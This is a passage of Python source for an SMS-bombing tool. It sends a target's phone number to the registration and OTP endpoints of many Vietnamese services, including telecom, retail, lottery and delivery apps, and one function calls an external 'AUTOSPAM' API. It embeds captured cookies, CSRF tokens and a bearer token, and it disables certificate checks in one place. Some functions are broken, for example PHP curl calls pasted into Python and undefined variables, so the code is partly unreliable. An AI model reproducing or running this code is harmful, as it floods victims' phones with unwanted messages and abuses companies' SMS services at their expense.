"https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
###
def ahamove(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)

def vieon1(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)        
    
def tiki(phone):
    response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=ua, json=jsdt).text  

def apiv5(phone):
    url = "https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={}".format(phone)
    requests.post(url)

def moca(phone):
    home = requests.get('https://moca.vn/moca/v2/users/role', params=paramss, headers=headerss).json()
    token = home['data']['registrationId']
    response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headerss).json()
    
def gbay(phone):
    json_data = {'phone_number': phone,'hash': random_string(40),}
    requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()
 
def tgdd(phone):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
        '_ce.s': 'v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940',
        '_ce.clock_event': '1',
        'SvID': 'beline2686|ZHFg6|ZHFg5',
        '_ce.clock_data': '-113%2C14.225.211.123%2C1',
        'cebsp_': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '5MoF_IoMgcKATLRi4lIvjOVPQrd',
        'lhc_per': 'vid|eadd7b088636140f774e',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_Personal=%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE; _gid=GA1.2.2106570071.1685151972; _ga_TLRZMSX5ME=GS1.1.1685151972.1.0.1685151972.60.0.0; _ga=GA1.1.2004811826.1685151972; _fbp=fb.1.1685151972814.1550382232; cebs=1; _ce.s=v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940; _ce.clock_event=1; SvID=beline2686|ZHFg6|ZHFg5; _ce.clock_data=-113%2C14.225.211.123%2C1; cebsp_=1; _tt_enable_cookie=1; _ttp=5MoF_IoMgcKATLRi4lIvjOVPQrd; lhc_per=vid|eadd7b088636140f774e',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)    

def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

def BIBABO(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }

    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)

def SWIFT247(sdt):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, json=postdata)         

def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54",
        "app-version": "1",
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "i18next-language": "vi",
        "api-version": "2",
        "platform": "SELLER_WEB",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://seller.kilo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    email = random.choice(['a', 'b', 'c', 'd', 'e', 'f']) + "@gmail.com"  # Email đăng ký tài khoản
    data = json.dumps({"phone": sdt, "email": email})
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)

def GAPO(sdt):
    Headers = [
        "Host: api.gapo.vn",
        "Content-Length: 31",
        "Content-Type: application/json",
        "Sec-Ch-Ua-Mobile: ?1",
        "Authorization: Bearer",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform: \"Android\"",
        "Accept: */*",
        "Origin: https://www.gapo.vn",
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://www.gapo.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ]
    Data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    Options = {
        "http": {
            "header": "\r\n".join(Headers),
            "method": "POST",
            "content": json.dumps(Data),
            "ignore_errors": True
        }
    }
    Context = ssl._create_unverified_context()
    Result = urllib.request.urlopen("https://api.gapo.vn/auth/v2.0/signup", data=json.dumps(Data).encode('utf-8'), context=Context)

def PHUCLONG(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
  
    data = {
        "phoneNumber": sdt,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', data=datason, headers=headers)

def VIETLOTT(sdt):
    headers = {
        "Host": "api-mobi.vietlottsms.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "ClientCallAPI": "EMB",
        "deviceId": "",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "/",
        "partnerChannel": "WEB",
        "Identify-Device-Token": "",
        "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://vietlott-sms.vn",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://vietlott-sms.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {'phoneNumber': sdt}
    datason = json.dumps(data)
    
    url = 'https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber'
    
    response = requests.post(url, data=datason, headers=headers)

def CONCUNG(sdt):
  headers = {
    "Host": "concung.com",
    "content-length": "121",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept": "/",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://concung.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://concung.com/dang-nhap.html",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    "cookie": "gaBBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0"
  }
  postData = {
    "ajax": "1",
    "classAjax": "AjaxLogin",
    "methodAjax": "sendOtpLogin",
    "customerphone": sdt,
    "idcustomer": "0",
    "momoapp": "0",
    "back": "khach-hang.html"
  }
  ch = curlinit()
  curlsetopt(ch, CURLOPTURL, "https://concung.com/ajax.html")
  curlsetopt(ch, CURLOPTRETURNTRANSFER, 1)
  curlsetopt(ch, CURLOPTHEADER, 1)
  curlsetopt(ch, CURLINFOHEADEROUT, true)
  curlsetopt(ch, CURLOPTPOST, 1)
  curlsetopt(ch, CURLOPTPOSTFIELDS, postData)
  curlsetopt(ch, CURLOPTHTTPHEADER, headers)
  response = curlexec(ch)
  info = curlgetinfo(ch)
  curlclose(ch)

def GOTADI(sdt):
  headers = {
    "Host": "api.gotadi.com",
    "content-length": "44",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
